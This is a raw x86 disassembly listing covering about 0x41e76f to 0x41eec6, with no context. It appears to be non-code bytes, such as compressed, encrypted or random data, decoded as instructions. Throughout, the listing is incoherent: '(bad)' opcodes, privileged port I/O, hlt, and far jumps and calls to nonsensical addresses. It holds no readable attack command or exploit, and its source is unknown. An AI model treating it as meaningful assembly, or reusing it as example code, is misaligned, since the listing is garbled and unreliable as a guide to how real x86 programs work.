  41e76f:	aaa    
  41e770:	mov    dh,0x64
  41e772:	sbb    ebp,DWORD PTR [ecx+0x341ff3f3]
  41e778:	nop
  41e779:	loopne 0x41e7b5
  41e77b:	cmc    
  41e77c:	aam    0xc1
  41e77e:	mov    ds:0x5c3a57b,al
  41e783:	out    0x33,al
  41e785:	adc    al,BYTE PTR [edi+0x4f]
  41e788:	pop    ebp
  41e789:	sbb    ecx,edx
  41e78b:	pop    esi
  41e78c:	clc    
  41e78d:	xor    DWORD PTR [ecx],esi
  41e78f:	cli    
  41e790:	cmp    al,0xfc
  41e792:	sbb    al,0xce
  41e794:	hlt    
  41e795:	jg     0x41e780
  41e797:	clc    
  41e798:	jp     0x41e792
  41e79a:	jmp    0x41e791
  41e79c:	adc    edi,edi
  41e79e:	push   0xf5e86539
  41e7a3:	and    dl,BYTE PTR [eax+0x5ec59ec]
  41e7a9:	lods   al,BYTE PTR ds:[esi]
  41e7aa:	push   edx
  41e7ab:	out    0xb7,al
  41e7ad:	in     eax,0x35
  41e7af:	out    0xb,al
  41e7b1:	dec    ecx
  41e7b2:	or     al,0x7f
  41e7b4:	dec    esp
  41e7b5:	fisub  WORD PTR [ecx]
  41e7b7:	mov    ?,WORD PTR gs:[edi+0x3e]
  41e7bb:	je     0x41e7d6
  41e7bd:	xor    BYTE PTR [edx-0x6c1db160],dh
  41e7c3:	mov    dh,0xc4
  41e7c5:	mov    bh,0x80
  41e7c7:	out    0xce,eax
  41e7c9:	outs   dx,BYTE PTR ds:[esi]
  41e7ca:	jg     0x41e7a2
  41e7cc:	dec    DWORD PTR [ecx+eiz*8+0x7]
  41e7d0:	scas   eax,DWORD PTR es:[edi]
  41e7d1:	js     0x41e831
  41e7d3:	test   eax,0xe315ddcf
  41e7d8:	daa    
  41e7d9:	lahf   
  41e7da:	enter  0x9abb,0xa6
  41e7de:	sbb    BYTE PTR es:[edx-0x12],cl
  41e7e2:	sbb    eax,DWORD PTR [edi]
  41e7e4:	ret    0xdd7c
  41e7e7:	shl    DWORD PTR [esi+0x2b0264e],cl
  41e7ed:	and    BYTE PTR [edi+0x20865c0c],ch
  41e7f3:	call   0x2e1f5f7a
  41e7f8:	add    DWORD PTR [ecx+0x8],ebp
  41e7fb:	jns    0x41e842
  41e7fd:	fwait
  41e7fe:	das    
  41e7ff:	dec    esi
  41e800:	(bad)  
  41e802:	call   0xd22b922
  41e807:	dec    ecx
  41e808:	sbb    al,0x63
  41e80a:	aas    
  41e80b:	dec    bl
  41e80d:	fisub  WORD PTR ds:0x556c4404
  41e813:	jp     0x41e885
  41e815:	cdq    
  41e816:	fcomp  QWORD PTR [edi-0x70]
  41e819:	aas    
  41e81a:	inc    esi
  41e81b:	mov    al,0x75
  41e81d:	stos   DWORD PTR es:[edi],eax
  41e81e:	retf   
  41e81f:	cdq    
  41e820:	rcl    dh,cl
  41e822:	mov    bh,0x27
  41e824:	and    al,0xbd
  41e826:	adc    BYTE PTR [eax-0x25],dh
  41e829:	(bad)  
  41e82a:	mov    dl,0x2b
  41e82c:	out    0x88,eax
  41e82e:	dec    esi
  41e82f:	or     ch,ah
  41e831:	mov    edi,0xf5ef9138
  41e836:	mov    dh,0x92
  41e838:	aaa    
  41e839:	mov    al,ds:0xd6f8f7bd
  41e83e:	dec    edi
  41e83f:	push   ebx
  41e841:	pop    edi
  41e842:	les    dx,DWORD PTR [esi+ecx*1+0x4ddbe193]
  41e84a:	in     al,dx
  41e84b:	sbb    al,BYTE PTR [ecx+0x3fc80dab]
  41e851:	or     eax,0xe099eef8
  41e856:	outs   dx,BYTE PTR ds:[esi]
  41e857:	out    dx,al
  41e858:	ds inc esi
  41e85a:	cwde   
  41e85b:	stos   BYTE PTR es:[edi],al
  41e85c:	(bad)  
  41e85d:	and    bh,BYTE PTR [ebx-0x6a106e7f]
  41e863:	sahf   
  41e864:	mov    al,ds:0x7c8e4ae7
  41e869:	test   al,0x1e
  41e86b:	call   0x88f8:0xdf2077c5
  41e872:	sub    eax,0xd0c0b2d6
  41e877:	jno    0x41e830
  41e879:	popa   
  41e87a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e87b:	cmp    al,0x32
  41e87d:	arpl   WORD PTR [eax-0x1e],bx
  41e880:	mov    es,WORD PTR [edx+0x16]
  41e883:	retf   
  41e884:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e885:	jmp    0xb4c8626d
  41e88a:	test   eax,0xa5c1a847
  41e88f:	jle    0x41e8d3
  41e891:	stos   BYTE PTR es:[edi],al
  41e892:	xor    DWORD PTR [esi+0x1478ecf8],ecx
  41e898:	mov    bh,0x83
  41e89a:	imul   esp,esi,0x4e5ef9b2
  41e8a0:	dec    eax
  41e8a1:	in     al,0x99
  41e8a3:	xor    bh,dh
  41e8a5:	add    ch,BYTE PTR [ebx+ebp*2-0x79]
  41e8a9:	ror    DWORD PTR [edi],cl
  41e8ab:	(bad)  
  41e8ac:	cwde   
  41e8ad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e8af:	mov    ds:0xae0a3b1e,eax
  41e8b4:	cmp    DWORD PTR ds:0xc39bea22,ebp
  41e8ba:	push   0xfffffffc
  41e8bc:	hlt    
  41e8bd:	repnz imul ebp,ecx,0x4e6e57fd
  41e8c4:	dec    eax
  41e8c5:	fld    QWORD PTR [edi]
  41e8c7:	std    
  41e8c8:	push   edx
  41e8c9:	out    0x5a,eax
  41e8cb:	inc    eax
  41e8cc:	addr16 (bad) 
  41e8ce:	retf   0xa8f5
  41e8d1:	loop   0x41e856
  41e8d3:	add    ch,ah
  41e8d5:	bound  esi,QWORD PTR [esi+0x4cff8cdc]
  41e8db:	adc    BYTE PTR gs:[edi+0x46],ch
  41e8df:	xchg   edi,eax
  41e8e0:	mov    bh,0x50
  41e8e2:	loop   0x41e8cb
  41e8e4:	in     al,0x3e
  41e8e6:	sub    BYTE PTR [ebp+0xe957875],dl
  41e8ec:	pop    esp
  41e8ed:	sub    ah,BYTE PTR [edx+0x3b]
  41e8f0:	ret    0x82d9
  41e8f3:	add    BYTE PTR [edx-0x5a],dl
  41e8f6:	mov    ds:0x2146e178,eax
  41e8fb:	mov    al,0x38
  41e8fd:	daa    
  41e8fe:	call   0xff09:0x491812e7
  41e905:	mov    ds:0x28aa1f47,eax
  41e90a:	pop    eax
  41e90b:	neg    BYTE PTR [esi+ebx*4+0x22f985b0]
  41e912:	sub    al,dh
  41e914:	cld    
  41e915:	test   eax,esp
  41e917:	mov    dh,0x63
  41e919:	fcmovnu st,st(6)
  41e91b:	cmp    eax,0xc3c217b6
  41e920:	jo     0x41e950
  41e922:	ficomp DWORD PTR [esi]
  41e924:	ss jl  0x41e907
  41e927:	not    esi
  41e929:	xchg   dh,al
  41e92b:	dec    esi
  41e92c:	or     al,0xaf
  41e92e:	fcom   DWORD PTR [ebx+0x55]
  41e931:	ds xchg edi,eax
  41e933:	sub    esp,DWORD PTR [esi+0x5c]
  41e936:	cmp    ecx,DWORD PTR ds:0xbf02a64d
  41e93c:	push   ecx
  41e93d:	repz rcr ebp,cl
  41e940:	fs daa 
  41e942:	mov    cs,eax
  41e944:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e945:	or     al,0x8d
  41e947:	add    BYTE PTR ds:0x290e10f5,cl
  41e94d:	dec    edx
  41e94e:	int    0xc5
  41e950:	out    0x82,al
  41e952:	or     ah,BYTE PTR [edi-0x15]
  41e955:	xor    al,0xa0
  41e957:	sub    BYTE PTR [ebx-0x3cabae92],dl
  41e95d:	push   cs
  41e95e:	push   ecx
  41e95f:	popf   
  41e960:	xor    al,BYTE PTR [eax+0x3d]
  41e963:	sbb    eax,0x8c744dbd
  41e968:	mov    eax,gs
  41e96a:	jge    0x41e9b1
  41e96c:	test   BYTE PTR [ecx+ebx*1],dh
  41e96f:	mov    ah,0xe8
  41e971:	mov    esp,0x42f49e75
  41e976:	daa    
  41e977:	add    al,0xe4
  41e979:	syscall 
  41e97b:	jnp    0x41e99e
  41e97d:	push   0x40c333e6
  41e982:	push   ss
  41e983:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e984:	mov    dl,0x7f
  41e986:	fst    DWORD PTR [ebx+0x73]
  41e989:	mov    esi,0xa36e5b38
  41e98e:	xor    edx,0xe2e94989
  41e994:	dec    esp
  41e995:	js     0x41e970
  41e997:	pop    eax
  41e998:	pop    es
  41e999:	or     DWORD PTR [ecx-0x63],esp
  41e99c:	jno    0x41e9da
  41e99e:	pop    edi
  41e99f:	mov    bh,0xd7
  41e9a1:	jg     0x41e9bd
  41e9a3:	push   esp
  41e9a4:	outs   dx,BYTE PTR ds:[esi]
  41e9a5:	adc    al,0xc5
  41e9a7:	sahf   
  41e9a8:	rcr    ecx,1
  41e9aa:	jns    0x41e97b
  41e9ac:	js     0x41e935
  41e9ae:	lock mov ecx,0xd141d7f0
  41e9b4:	lds    esi,FWORD PTR [ebx+0x39f15506]
  41e9ba:	sbb    al,0x16
  41e9bc:	pop    edx
  41e9bd:	mov    DWORD PTR [esi-0x56],eax
  41e9c0:	mul    ecx
  41e9c2:	pop    edx
  41e9c3:	jae    0x41e9bf
  41e9c5:	mov    cl,0x69
  41e9c7:	ret    
  41e9c8:	fmul   DWORD PTR [esi+0x2f9e58f8]
  41e9ce:	mov    al,ds:0x949b3fce
  41e9d3:	cli    
  41e9d4:	sbb    al,0xc5
  41e9d6:	jl     0x41e97c
  41e9d8:	jl     0x41e9a9
  41e9da:	jmp    0x9e6ba8f7
  41e9df:	jl     0x41e9af
  41e9e1:	xor    bl,BYTE PTR [esi-0x46]
  41e9e4:	hlt    
  41e9e5:	mov    ecx,0x79738d43
  41e9ea:	bsf    edx,esi
  41e9ed:	fdiv   QWORD PTR [ebx+0x900911b]
  41e9f3:	pushf  
  41e9f4:	sbb    DWORD PTR [ecx-0x8],esi
  41e9f7:	cmc    
  41e9f8:	jb     0x41ea62
  41e9fa:	mov    edi,0x234de789
  41e9ff:	dec    bl
  41ea01:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ea02:	dec    ecx
  41ea03:	xor    al,0x90
  41ea05:	xchg   BYTE PTR [esi],ah
  41ea07:	cmc    
  41ea08:	fiadd  DWORD PTR [edx-0xe318d7e]
  41ea0e:	push   cs
  41ea0f:	cmc    
  41ea10:	dec    esi
  41ea11:	fwait
  41ea12:	cmp    BYTE PTR [edi+0x44],bl
  41ea15:	pop    ds
  41ea16:	xchg   ebp,eax
  41ea17:	inc    ebp
  41ea18:	mov    esp,0x69ed18a
  41ea1d:	test   DWORD PTR [edx],eax
  41ea1f:	add    eax,0x61365b0a
  41ea24:	sub    DWORD PTR [edi],0xffffffa1
  41ea27:	inc    esp
  41ea28:	push   esp
  41ea29:	mov    cl,0xd9
  41ea2b:	mov    esi,0x229fa302
  41ea30:	imul   edi,esi,0x352976c4
  41ea36:	std    
  41ea37:	xchg   ebx,eax
  41ea38:	inc    ecx
  41ea39:	aaa    
  41ea3a:	inc    ecx
  41ea3b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ea3c:	xchg   BYTE PTR ds:0xf52af896,bh
  41ea42:	dec    ebp
  41ea43:	xchg   DWORD PTR [edi],ebp
  41ea45:	cmp    eax,0x1d8d489f
  41ea4a:	mov    ah,0x6c
  41ea4c:	and    DWORD PTR ds:[ebx],0x4036a511
  41ea53:	or     al,0x97
  41ea55:	mov    ch,0x25
  41ea57:	push   esi
  41ea58:	loopne 0x41ead5
  41ea5a:	ret    
  41ea5b:	add    dl,BYTE PTR [ecx]
  41ea5d:	out    0x72,eax
  41ea5f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ea60:	cdq    
  41ea61:	mov    ebp,DWORD PTR [eax+0x5a0be612]
  41ea67:	in     al,0x91
  41ea69:	push   edi
  41ea6a:	xor    dh,dl
  41ea6c:	jo     0x41ea20
  41ea6e:	and    ch,BYTE PTR [eax]
  41ea70:	dec    ecx
  41ea71:	mov    ah,0xe4
  41ea73:	lds    ebp,FWORD PTR [ebx]
  41ea75:	fucomip st,st(2)
  41ea77:	cmp    DWORD PTR [edi+0x62126b71],edi
  41ea7d:	jae    0x41ea50
  41ea7f:	jb     0x41ea0a
  41ea81:	xor    BYTE PTR [ecx],ch
  41ea83:	push   esp
  41ea84:	cld    
  41ea85:	add    ch,BYTE PTR [eax+0x1d3864df]
  41ea8b:	iret   
  41ea8c:	out    0xbb,eax
  41ea8e:	xchg   edx,eax
  41ea8f:	xchg   esp,eax
  41ea90:	fchs   
  41ea92:	jne    0x41ea43
  41ea94:	retf   0xd8d
  41ea97:	fcmovnu st,st(3)
  41ea99:	or     al,BYTE PTR [esi+0x4a]
  41ea9c:	jns    0x41ea9e
  41ea9e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ea9f:	xchg   ebp,eax
  41eaa0:	xor    DWORD PTR [eax],ecx
  41eaa2:	sbb    cl,BYTE PTR [eax+0x17863622]
  41eaa8:	test   ah,0xad
  41eaab:	cmp    ebx,edx
  41eaad:	add    dl,BYTE PTR [esi-0x56]
  41eab0:	rcl    BYTE PTR [edx+0x21],1
  41eab3:	adc    al,0xfa
  41eab5:	add    BYTE PTR [edi+eax*8],al
  41eab8:	mov    bl,0x22
  41eaba:	rcr    eax,cl
  41eabc:	jle    0x41eb1d
  41eabe:	push   ebx
  41eabf:	dec    esp
  41eac0:	pop    eax
  41eac1:	push   cs
  41eac2:	aam    0x45
  41eac4:	or     ch,BYTE PTR [ecx+ebp*8]
  41eac7:	sbb    eax,0x1dfa5682
  41eacc:	mov    ds:0x546bfe0e,al
  41ead1:	push   cs
  41ead2:	imul   ecx,DWORD PTR ds:0xf0c61acc,0xffffff85
  41ead9:	and    al,0x8c
  41eadb:	cmp    bl,bl
  41eadd:	test   eax,0x19834c96
  41eae2:	adc    cl,ah
  41eae4:	fucomi st,st(0)
  41eae6:	or     DWORD PTR [ebp+0x2f],0x16
  41eaea:	cld    
  41eaeb:	ja     0x41eb19
  41eaed:	mov    bl,0xd0
  41eaef:	adc    eax,0x567bda6f
  41eaf4:	jb     0x41eaab
  41eaf6:	adc    BYTE PTR [ecx+0x43],ch
  41eaf9:	fsub   DWORD PTR [ebp-0x6c0cd7f3]
  41eaff:	sub    ecx,DWORD PTR [ebp+ebx*4+0x12a647a]
  41eb06:	mov    edx,0x5833b954
  41eb0b:	jb     0x41eaa6
  41eb0d:	and    al,0x5a
  41eb0f:	sbb    dh,BYTE PTR [ebx+esi*2]
  41eb12:	enter  0xde3,0x31
  41eb16:	xchg   ch,ah
  41eb18:	clc    
  41eb19:	sub    eax,edi
  41eb1b:	scas   eax,DWORD PTR es:[edi]
  41eb1c:	cmp    edx,edi
  41eb1e:	ja     0x41eaf3
  41eb20:	mov    dh,0x55
  41eb22:	das    
  41eb23:	inc    edi
  41eb24:	call   0x31cb:0x40270375
  41eb2b:	or     eax,0xf67d808c
  41eb30:	cmp    DWORD PTR [ebp+0x73],ebx
  41eb33:	out    0x44,eax
  41eb35:	sub    edi,ebx
  41eb37:	jecxz  0x41eba0
  41eb39:	jns    0x41eaf2
  41eb3b:	cli    
  41eb3c:	and    al,bh
  41eb3e:	pop    edi
  41eb3f:	pop    ds
  41eb40:	mov    ?,edx
  41eb42:	mov    ds:0x82a3772b,al
  41eb47:	retf   0xf18c
  41eb4a:	ret    0x8895
  41eb4d:	enter  0xd77e,0x14
  41eb51:	jb     0x41ead5
  41eb53:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41eb54:	inc    ecx
  41eb55:	jmp    0x41eb07
  41eb57:	sbb    edi,DWORD PTR [ecx-0x3d]
  41eb5a:	add    bh,BYTE PTR [ebx-0x32]
  41eb5d:	sbb    BYTE PTR [ecx],al
  41eb5f:	jmp    0x41ebdd
  41eb61:	mov    al,ds:0xfcbe1e52
  41eb66:	push   ecx
  41eb67:	add    esp,DWORD PTR [ecx]
  41eb69:	xchg   ebx,eax
  41eb6a:	or     ebp,DWORD PTR [ebx+0x4476e36a]
  41eb70:	adc    eax,0xe507596e
  41eb75:	mov    esp,0x7e250907
  41eb7a:	sbb    al,0x21
  41eb7c:	int    0xb
  41eb7e:	out    0x70,eax
  41eb80:	xchg   ebp,eax
  41eb81:	and    eax,0x6a0c6b16
  41eb86:	xadd   BYTE PTR [eax+ebx*1+0x76],bh
  41eb8b:	aam    0xc6
  41eb8d:	loope  0x41eb8f
  41eb8f:	mov    esp,0x85da6e85
  41eb94:	cld    
  41eb95:	gs aaa 
  41eb97:	dec    ebx
  41eb98:	lds    edx,FWORD PTR [esp+edx*2+0x45f861f6]
  41eb9f:	imul   esp,DWORD PTR [esi-0x2f34529a],0xfffffffb
  41eba6:	xor    BYTE PTR [ebx-0x1a6af014],ah
  41ebac:	(bad)  
  41ebad:	ins    BYTE PTR es:[edi],dx
  41ebae:	push   esp
  41ebaf:	int3   
  41ebb0:	stos   BYTE PTR es:[edi],al
  41ebb1:	sub    al,0x2b
  41ebb3:	mov    dl,0x26
  41ebb5:	add    esi,DWORD PTR [ebx+0x1c2e3a70]
  41ebbb:	mov    dl,0x9e
  41ebbd:	pop    ecx
  41ebbe:	pop    ss
  41ebbf:	pop    eax
  41ebc0:	jbe    0x41ec3a
  41ebc2:	aam    0xed
  41ebc4:	enter  0x76db,0xa1
  41ebc8:	scas   al,BYTE PTR es:[edi]
  41ebc9:	adc    cl,BYTE PTR [edi-0x5a]
  41ebcc:	jge    0x41ebcc
  41ebce:	xchg   ebx,eax
  41ebcf:	mov    esi,DWORD PTR [esi]
  41ebd1:	sub    eax,0x9e594845
  41ebd6:	icebp  
  41ebd7:	nop
  41ebd8:	test   DWORD PTR [ebx+0x24],ebx
  41ebdb:	sti    
  41ebdc:	adc    DWORD PTR [esi-0x5f],ebx
  41ebdf:	ins    BYTE PTR es:[edi],dx
  41ebe0:	je     0x41ebe1
  41ebe2:	add    eax,0xf960e40e
  41ebe7:	dec    eax
  41ebe8:	ret    0x7a22
  41ebeb:	rcl    DWORD PTR [edi+0x14],0xc2
  41ebef:	jno    0x41eb71
  41ebf1:	fs stos BYTE PTR es:[edi],al
  41ebf3:	imul   ebx,esi,0x71
  41ebf6:	retf   0xd987
  41ebf9:	push   edi
  41ebfa:	aad    0xfa
  41ebfc:	xchg   esp,eax
  41ebfd:	mov    edi,0x77f61db1
  41ec02:	rol    DWORD PTR [ebp-0x59],1
  41ec05:	shr    BYTE PTR [ebx+esi*8+0x18909fbf],1
  41ec0c:	jb     0x41ebb3
  41ec0e:	out    0xd9,al
  41ec10:	dec    edi
  41ec11:	jo     0x41ec71
  41ec13:	cmp    DWORD PTR [edx],ebx
  41ec15:	bound  edx,QWORD PTR [edx-0x3d045e35]
  41ec1b:	dec    esi
  41ec1c:	cmp    ecx,ebp
  41ec1e:	outs   dx,BYTE PTR ds:[esi]
  41ec1f:	shr    dl,cl
  41ec21:	mov    ecx,0xfafd4459
  41ec26:	pop    ebp
  41ec27:	lahf   
  41ec28:	inc    edi
  41ec29:	cld    
  41ec2a:	pop    ecx
  41ec2b:	aam    0x5b
  41ec2d:	inc    edi
  41ec2e:	shr    BYTE PTR [ebx],cl
  41ec30:	sub    ah,BYTE PTR [edx+0x41af9274]
  41ec36:	or     DWORD PTR [edx],edx
  41ec38:	popf   
  41ec39:	aas    
  41ec3a:	jl     0x41ebc7
  41ec3c:	inc    ecx
  41ec3d:	shr    DWORD PTR [esi-0x20c959f],cl
  41ec43:	call   FWORD PTR [edx+edx*1+0x6fed0a22]
  41ec4a:	ins    BYTE PTR es:[edi],dx
  41ec4b:	repnz ror BYTE PTR [ebp+edx*8-0x30a662cf],cl
  41ec53:	inc    ebx
  41ec54:	mov    ch,0xf2
  41ec56:	mov    eax,ds:0x1f073395
  41ec5b:	cmp    eax,0x9363101f
  41ec60:	sub    al,0xbc
  41ec62:	mov    esi,eax
  41ec64:	mov    dh,0x6f
  41ec66:	add    bl,BYTE PTR [edx]
  41ec68:	mov    esi,DWORD PTR [esi+ebx*8-0x6f]
  41ec6c:	ss push 0x8ea77743
  41ec72:	push   esi
  41ec73:	or     BYTE PTR [edi+0xa],bl
  41ec76:	sbb    eax,0xbe7a8612
  41ec7b:	or     edx,ecx
  41ec7d:	aaa    
  41ec7e:	xchg   ecx,eax
  41ec7f:	or     BYTE PTR [ecx-0x3],bh
  41ec82:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ec83:	ret    
  41ec84:	test   BYTE PTR [esi],cl
  41ec86:	cs aaa 
  41ec88:	mov    edi,0xef51028d
  41ec8d:	mov    esp,0xfe6b8a41
  41ec92:	stos   DWORD PTR es:[edi],eax
  41ec93:	div    ch
  41ec95:	in     al,0x57
  41ec97:	dec    esp
  41ec98:	jmp    0x322265a4
  41ec9d:	dec    esi
  41ec9e:	push   ebx
  41ec9f:	dec    eax
  41eca0:	push   edi
  41eca1:	call   0x3bddae19
  41eca6:	sub    al,BYTE PTR [edx-0x78]
  41eca9:	add    BYTE PTR [edi+0x600124fb],dl
  41ecaf:	dec    esp
  41ecb0:	and    ebp,DWORD PTR [ecx+eax*4-0x6d898a67]
  41ecb7:	pop    edx
  41ecb8:	and    eax,0xec872057
  41ecbd:	lea    edi,[ebx+0x1dee4ef8]
  41ecc3:	cld    
  41ecc4:	cwde   
  41ecc5:	push   ds
  41ecc6:	sbb    DWORD PTR [edx-0x1d817dcc],eax
  41eccc:	jmp    0x41ed4d
  41ecce:	fisub  WORD PTR [edx-0x245c5fdc]
  41ecd4:	mov    bl,al
  41ecd6:	or     eax,0x71aa8253
  41ecdb:	pop    ebx
  41ecdc:	add    ah,BYTE PTR [esi-0x10]
  41ecdf:	or     BYTE PTR [eax+ebp*2-0x5a],0x9b
  41ece4:	addr16 loopne 0x41ecd2
  41ece7:	jmp    0x41ed0b
  41ece9:	int    0x38
  41eceb:	sti    
  41ecec:	icebp  
  41eced:	or     eax,0x7b98ae29
  41ecf2:	push   edi
  41ecf3:	scas   eax,DWORD PTR es:[edi]
  41ecf4:	cmp    bl,0x70
  41ecf7:	jl     0x41ed13
  41ecf9:	inc    eax
  41ecfa:	inc    edi
  41ecfb:	rcr    ebp,1
  41ecfd:	add    BYTE PTR [ecx-0x6db76451],dl
  41ed03:	or     DWORD PTR ds:0xeaab22d2,esp
  41ed09:	dec    ebx
  41ed0a:	jmp    0x82ab:0xe382cc9
  41ed11:	mov    edi,0xe62fa9c4
  41ed16:	sub    al,0xe3
  41ed18:	or     eax,0x6bbc22df
  41ed1d:	mov    ebx,DWORD PTR [ebx]
  41ed1f:	pop    ds
  41ed20:	mov    bh,0xdc
  41ed22:	adc    eax,0x803ac3c5
  41ed27:	addr16 ret 
  41ed29:	xor    edx,DWORD PTR [esi+0x660e7cce]
  41ed2f:	call   DWORD PTR [esi-0x4f]
  41ed32:	test   al,0xc8
  41ed34:	inc    ebp
  41ed35:	adc    DWORD PTR [edx],esi
  41ed37:	in     eax,0x13
  41ed39:	fmulp  st(1),st
  41ed3b:	jne    0x41ed2e
  41ed3d:	mov    al,BYTE PTR [ecx+0x6a]
  41ed40:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ed41:	aad    0xfe
  41ed43:	cmp    BYTE PTR [edi+0x56],bh
  41ed46:	pop    edi
  41ed47:	xchg   edi,eax
  41ed48:	dec    edi
  41ed49:	scas   eax,DWORD PTR es:[edi]
  41ed4a:	jb     0x41ecd0
  41ed4c:	popf   
  41ed4d:	xchg   esp,eax
  41ed4e:	mov    ebp,0xc12636b8
  41ed53:	adc    BYTE PTR [ebp+0x16],bl
  41ed56:	scas   al,BYTE PTR es:[edi]
  41ed57:	int    0xee
  41ed59:	fs dec eax
  41ed5b:	dec    ebp
  41ed5c:	xor    eax,0xf6ed4b13
  41ed61:	cmp    edi,edi
  41ed63:	cmp    eax,0xdce5719f
  41ed68:	scas   eax,DWORD PTR es:[edi]
  41ed69:	dec    eax
  41ed6a:	int3   
  41ed6b:	xchg   edx,eax
  41ed6c:	mov    ebx,0x8f2f7935
  41ed71:	sbb    ah,BYTE PTR [edx-0x36]
  41ed74:	inc    eax
  41ed75:	into   
  41ed76:	inc    eax
  41ed77:	arpl   WORD PTR [ebx],di
  41ed79:	dec    ebx
  41ed7a:	xor    esi,DWORD PTR [ecx-0x38f894de]
  41ed80:	retf   0xdbab
  41ed83:	bnd jbe 0x41ed2f
  41ed86:	cld    
  41ed87:	fcmovu st,st(0)
  41ed89:	fcmovbe st,st(6)
  41ed8b:	dec    eax
  41ed8c:	pop    ebx
  41ed8d:	dec    ebx
  41ed8e:	ins    BYTE PTR es:[edi],dx
  41ed8f:	xchg   ebp,eax
  41ed90:	lock mov dh,BYTE PTR [esi]
  41ed93:	mov    ah,BYTE PTR [edx-0x1]
  41ed96:	retf   0xebcd
  41ed99:	adc    al,0x8e
  41ed9b:	pusha  
  41ed9c:	les    esi,FWORD PTR [ecx+eax*4]
  41ed9f:	ins    BYTE PTR es:[edi],dx
  41eda0:	retf   0xb65c
  41eda3:	and    BYTE PTR es:[edi],ah
  41eda6:	loopne 0x41ed30
  41eda8:	adc    eax,0x26ca71e0
  41edad:	nop
  41edae:	mov    DWORD PTR [edi+0x2c],edx
  41edb1:	mov    DWORD PTR [eax],ebp
  41edb3:	loop   0x41ed72
  41edb5:	sbb    eax,0x2d18ecc8
  41edba:	out    0xf1,eax
  41edbc:	mov    ch,0x95
  41edbe:	ficomp DWORD PTR [esi]
  41edc0:	clc    
  41edc1:	test   DWORD PTR [ebp+0x48],ecx
  41edc4:	lods   eax,DWORD PTR ds:[esi]
  41edc5:	je     0x41ee05
  41edc7:	adc    ah,ch
  41edc9:	sub    bl,BYTE PTR [ebx-0x6754f57b]
  41edcf:	adc    dl,BYTE PTR [edx]
  41edd1:	push   eax
  41edd2:	fnclex 
  41edd4:	inc    ecx
  41edd5:	ret    
  41edd6:	add    al,0xd1
  41edd8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41edd9:	push   ebp
  41edda:	pop    es
  41eddb:	mov    bl,al
  41eddd:	adc    BYTE PTR [ebp-0x13bc172d],bl
  41ede3:	cmp    BYTE PTR [edx-0x32cee9ba],bl
  41ede9:	or     al,0x85
  41edeb:	loope  0x41ee02
  41eded:	js     0x41edfc
  41edef:	inc    edi
  41edf0:	(bad)  
  41edf1:	mov    esp,0xe71de2ea
  41edf6:	sar    DWORD PTR [ebx-0x1171658a],0x70
  41edfd:	test   DWORD PTR [ecx],0x385045d6
  41ee03:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ee04:	in     eax,0xa0
  41ee06:	std    
  41ee07:	outs   dx,BYTE PTR ds:[esi]
  41ee08:	cld    
  41ee09:	stc    
  41ee0a:	outs   dx,DWORD PTR es:[esi]
  41ee0c:	gs scas eax,DWORD PTR es:[edi]
  41ee0e:	inc    ebp
  41ee0f:	rol    BYTE PTR [edx+0x23b55ebb],0x9e
  41ee16:	fst    st(2)
  41ee18:	pop    edx
  41ee19:	mov    bl,BYTE PTR [ebx]
  41ee1b:	sub    bh,BYTE PTR [ecx+edx*8-0x4784b377]
  41ee22:	repz or eax,0x3b12a6a6
  41ee28:	adc    dl,BYTE PTR [esi+ebx*4]
  41ee2b:	psrad  mm4,QWORD PTR cs:0xd12b33da
  41ee33:	jnp    0x41ee09
  41ee35:	jmp    0x41ee40
  41ee37:	(bad)  
  41ee38:	sbb    esp,esp
  41ee3a:	jmp    0xef7d09cd
  41ee3f:	in     eax,0xb6
  41ee41:	mov    bl,0xbe
  41ee43:	mov    ah,0xc7
  41ee45:	jecxz  0x41eddd
  41ee47:	dec    ecx
  41ee48:	inc    esi
  41ee49:	fimul  DWORD PTR [ecx-0x20]
  41ee4c:	mov    fs,ebp
  41ee4e:	outs   dx,BYTE PTR ds:[esi]
  41ee4f:	xchg   edx,eax
  41ee50:	mov    al,ds:0xf26de894
  41ee55:	jmp    0xa358:0x8edddb16
  41ee5c:	loop   0x41ee6e
  41ee5e:	pop    ds
  41ee5f:	and    DWORD PTR [ebx+0x58285be7],0x27
  41ee66:	rcl    BYTE PTR [ecx],cl
  41ee68:	cmc    
  41ee69:	mov    eax,ds:0x974b7c4e
  41ee6e:	ret    0x45dd
  41ee71:	and    ecx,esi
  41ee73:	jne    0x41ee6c
  41ee75:	mov    eax,0xd64545bb
  41ee7a:	pop    edx
  41ee7b:	push   0x7a
  41ee7d:	jnp    0x41ee03
  41ee7f:	inc    esi
  41ee80:	push   ebp
  41ee81:	in     eax,0x19
  41ee83:	add    ebx,DWORD PTR [ecx+0x32]
  41ee86:	es mov cl,0x39
  41ee89:	pop    edx
  41ee8a:	daa    
  41ee8b:	jecxz  0x41ee16
  41ee8d:	or     bl,ah
  41ee8f:	nop
  41ee90:	mov    esp,0x5fcca3e2
  41ee95:	mov    esi,0xf7acd241
  41ee9a:	sbb    BYTE PTR [edx],ah
  41ee9c:	sub    ch,cl
  41ee9e:	pop    esp
  41ee9f:	iret   
  41eea0:	ja     0x41eed2
  41eea2:	dec    eax
  41eea3:	cmp    edx,DWORD PTR [edi+0x7a]
  41eea6:	daa    
  41eea7:	stos   BYTE PTR es:[edi],al
  41eea8:	adc    al,0x2a
  41eeaa:	hlt    
  41eeab:	jmp    0x41ee46
  41eead:	lea    ebx,[eax-0x46]
  41eeb0:	or     dl,ah
  41eeb2:	(bad)  
  41eeb3:	jmp    0x92e8:0xb6ae1b64
  41eeba:	jle    0x41ee84
  41eebc:	scas   eax,DWORD PTR es:[edi]
  41eebd:	addr16 mov edx,0x8d1084a2
  41eec3:	ins    BYTE PTR es:[edi],dx
  41eec4:	jb     0x41eef6
  41eec6:	test   al,0xf8
